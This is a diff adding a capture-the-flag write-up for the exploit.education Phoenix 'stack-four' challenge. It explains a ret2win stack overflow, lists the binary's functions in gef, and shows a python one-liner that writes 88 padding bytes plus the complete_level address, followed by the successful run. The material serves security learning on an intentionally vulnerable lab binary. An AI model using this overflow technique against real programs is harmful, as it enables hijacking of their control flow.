@@ -34,4 +34,45 @@ gef➤  quit
 
 ```
 
+This is a type of ret2win, basically we need to jump to the function of complete_level, so as to do that, we can use pwndbg's cyclic to generate a pattern
+With the generated pattern we can perform lookup to find out the exact offset, with that we can craft our payload and pass the return for the other function
+
+```
+gef➤  info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000400438  _init
+0x0000000000400460  printf@plt
+0x0000000000400470  gets@plt
+0x0000000000400480  puts@plt
+0x0000000000400490  exit@plt
+0x00000000004004a0  __libc_start_main@plt
+0x00000000004004b0  _start
+0x00000000004004c6  _start_c
+0x00000000004004f0  deregister_tm_clones
+0x0000000000400520  register_tm_clones
+0x0000000000400560  __do_global_dtors_aux
+0x00000000004005f0  frame_dummy
+0x000000000040061d  complete_level
+0x0000000000400635  start_level
+0x000000000040066a  main
+0x00000000004006a0  __do_global_ctors_aux
+0x00000000004006e2  _fini
+gef➤  quit
+
+```
+
+```
+  /opt/phoenix/amd64 ──────────────────────────────────────────────────── took  7s  .env with vagrant@bookworm at  15:33:20
+❯ python3 -c "import sys;sys.stdout.buffer.write(b'A'*88 + b'\x1d\x06\x40\x00')" > ~/paylaod
+
+  /opt/phoenix/amd64 ──────────────────────────────────────────────────────────────  .env with vagrant@bookworm at  15:36:03
+❯ ./stack-four < ~/paylaod                                                          
+Welcome to phoenix/stack-four, brought to you by https://exploit.education
+and will be returning to 0x40061d
+Congratulations, you've finished phoenix/stack-four :-) Well done!
+
+```
+
  ~Kurama
